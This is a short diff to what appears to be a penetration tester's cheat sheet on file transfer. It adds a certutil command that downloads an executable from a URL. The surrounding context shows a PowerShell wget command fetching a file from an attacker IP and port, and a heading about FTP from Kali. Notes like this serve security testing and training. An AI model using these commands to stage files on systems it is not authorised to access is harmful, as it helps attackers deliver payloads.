@@ -18,6 +18,12 @@ powershell wget "http://<attacker ip>:<attacker port>/<file to transfer>" -outfi
 
 -------------------------------------------
 
+# certutil
+
+certutil.exe -urlcache -split -f https://example.com/file.exe file.exe
+
+---------------------------
+
 FTP (pureftpd client on Kali)
 
 # on Kali
